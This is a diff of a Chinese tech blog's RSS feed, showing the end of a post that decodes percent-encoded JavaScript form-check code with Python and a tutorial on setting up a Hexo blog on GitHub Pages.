style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unquote(a&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;b)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到代码如下：&lt;/p&gt;</description>
     </item>
     <item>
       <title>使用hexo和github搭建网站</title>
       <link>https://ch3n9w.github.io/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
       <pubDate>Mon, 22 Apr 2019 03:12:31 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
-      <description>基础修改 修改 _config.yml，写上网站的标题
-title: subtitle: description: 选择主题
-theme: next hexo 插件 字数统计和阅读时长统计 https://github.com/theme-next/hexo-symbols-count-time
-在 _config.yml 中添加
-symbols_count_time: symbols: true time: true total_symbols: true total_time: true exclude_codeblock: false awl: 4 wpm: 275 suffix: &amp;#34;mins.&amp;#34; 在Next主题中的 _config.yml中添加
-symbols_count_time: separated_meta: true item_text_post: true item_text_total: true git 部署 在你的github账户上创建仓库yourusername.github.io，必须是用户名开头命名，否则github page不会生效。
-首先生成个人公私钥
-cd ssh-keygen -t rsa -C &amp;#34;your_email@example.com&amp;#34; 然后将公钥粘贴进github账户的个人设置里面 ssh -T git@github.com git config --global user.name &amp;#34;username&amp;#34; git config --global user.email &amp;#34;email&amp;#34; 在博客目录下下载：
-npm install hexo-deployer-git --save 修改网站根目录下的_config.</description>
+      <description>&lt;h2 id=&#34;基础修改&#34;&gt;基础修改&lt;/h2&gt;
+&lt;p&gt;修改 _config.yml，写上网站的标题&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;title:
+subtitle:
+description:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;选择主题&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;theme: next
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hexo-插件&#34;&gt;hexo 插件&lt;/h2&gt;
+&lt;h3 id=&#34;字数统计和阅读时长统计&#34;&gt;字数统计和阅读时长统计&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/theme-next/hexo-symbols-count-time&#34;&gt;https://github.com/theme-next/hexo-symbols-count-time&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在 _config.yml 中添加&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;symbols_count_time:
+  symbols: true
+  time: true
+  total_symbols: true
+  total_time: true
+  exclude_codeblock: false
+  awl: 4
+  wpm: 275
+  suffix: &amp;#34;mins.&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在Next主题中的 _config.yml中添加&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;symbols_count_time:
+  separated_meta: true
+  item_text_post: true
+  item_text_total: true
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;git-部署&#34;&gt;git 部署&lt;/h3&gt;
+&lt;p&gt;在你的github账户上创建仓库&lt;code&gt;yourusername.github.io&lt;/code&gt;，必须是用户名开头命名，否则&lt;code&gt;github page&lt;/code&gt;不会生效。&lt;/p&gt;
+&lt;p&gt;首先生成个人公私钥&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd
+ssh-keygen -t rsa -C &amp;#34;your_email@example.com&amp;#34;
+然后将公钥粘贴进github账户的个人设置里面
+ssh -T git@github.com
+git config --global user.name &amp;#34;username&amp;#34;
+git config --global user.email &amp;#34;email&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在博客目录下下载：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;npm install hexo-deployer-git --save
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改网站根目录下的_config.yml文件&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deploy:
+  - type: git#注意git的前面要加空格否则不生效
+  	repo: https://github.com/example/example.github.io.git
+  	branch: master
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;保存退出后执行命令：&lt;/p&gt;</description>
     </item>
     <item>
       <title>ch3n9w 的 vim</title>
